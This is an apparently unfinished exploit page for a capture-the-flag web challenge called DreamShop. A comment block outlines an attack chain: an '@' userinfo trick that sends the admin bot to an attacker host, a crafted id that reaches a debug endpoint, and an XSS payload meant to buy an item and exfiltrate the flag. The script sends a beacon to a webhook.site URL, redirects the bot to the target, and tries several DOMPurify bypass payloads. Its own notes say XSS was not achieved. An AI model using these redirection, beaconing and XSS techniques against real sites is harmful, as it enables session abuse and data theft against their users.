<!--
DreamShop Exploit Summary
=========================

Attack Vector:
1. Report path uses @ trick to bypass // check
2. Redirect to localhost:3000 with crafted id
3. Crafted id hits /debug/ endpoint for custom JSON response
4. JSON contains XSS payload (mXSS bypass needed)
5. XSS fetches /4/buy and exfils flag

Constraints:
- Path cannot contain //
- /debug/ has 22 char limit
- DOMPurify sanitizes detail field

Key Finding:
- path = "@evil.com/x" makes puppeteer visit evil.com
- URL: http://localhost:3000@evil.com/x
- Parsed as: host=evil.com, user=localhost, pass=3000

22-char JSON Payloads (testing):
- {"id":4}           (8 chars) - No XSS
- {"detail":"test"}  (18 chars) - Safe text only
- {"detail":"<b>x"}  (17 chars) - Bold tag, no XSS

mXSS Requirements:
- DOMPurify 2.0.17 이전 버전 필요
- <math><mtext><table><mglyph><style>... 패턴
- 22자 이내 불가능

Alternative Approaches:
1. Form auto-submit via HTML injection - blocked by DOMPurify
2. DOM Clobbering - window.login already assigned
3. iframe/object injection - blocked by DOMPurify

Current Status: XSS not achievable within 22 char limit

Recommended Next Steps:
1. Test if Vue Router decodes %2f before matching
2. Test DOMPurify version and known bypasses
3. Look for other injection points in the app
-->

<!DOCTYPE html>
<html>
<head>
    <title>DreamShop Exploit</title>
</head>
<body>
    <h1>Exploit Page</h1>
    <p>This page should be hosted on your server.</p>
    <p>Report path: @yourserver.com/this_page.html</p>
    
    <script>
        // Configuration
        const WEBHOOK = 'https://webhook.site/49a58c37-eb88-47dc-aa89-3931c4df2c95';
        const TARGET = 'http://host8.dreamhack.games:11130';
        
        // Log our presence
        fetch(WEBHOOK + '?event=exploit_loaded&time=' + Date.now());
        
        // Strategy 1: Simple redirect to item 4 detail
        // Admin is already logged in, just need to trigger buy
        function strategy1() {
            window.location.href = TARGET + '/#/4/detail';
        }
        
        // Strategy 2: Crafted id to hit /debug/ endpoint
        // id = "debug/JSON?" makes axios request to /debug/JSON?/info
        function strategy2() {
            // 22 char JSON payload
            // Best we can do without XSS: valid item JSON
            var payload = '{"id":4,"price":0}';  // 18 chars - but price check is server-side!
            
            // URL encode for Vue Router
            var encodedId = 'debug%2f' + encodeURIComponent(payload) + '%3f';
            
            window.location.href = TARGET + '/#/' + encodedId + '/detail';
        }
        
        // Strategy 3: Try mXSS with short payload
        function strategy3() {
            // Shortest mXSS attempt (will likely fail)
            // <svg><style> starts mXSS context
            var payload = '{"detail":"<svg><style>"}';  // 25 chars - TOO LONG!
            
            // Try shorter
            payload = '{"detail":"<style>"}';  // 21 chars - might work?
            // But <style> alone doesn't give XSS...
            
            var encodedId = 'debug%2f' + encodeURIComponent(payload) + '%3f';
            window.location.href = TARGET + '/#/' + encodedId + '/detail';
        }
        
        // Strategy 4: Form action override (needs DOMPurify to allow)
        function strategy4() {
            // Try to inject form with action to our webhook
            // DOMPurify DOES allow <form action=...>!
            // But auto-submit requires JS event which is blocked
            
            // <form action=//webhook.site/xxx><input name=x>
            // This is over 22 chars...
            
            var payload = '{"detail":"<form action=//a.co>"}';  // 33 chars - TOO LONG
        }
        
        // Execute strategy
        // For testing, let's try strategy 1 first (simplest)
        setTimeout(function() {
            strategy1();
        }, 500);
    </script>
</body>
</html>
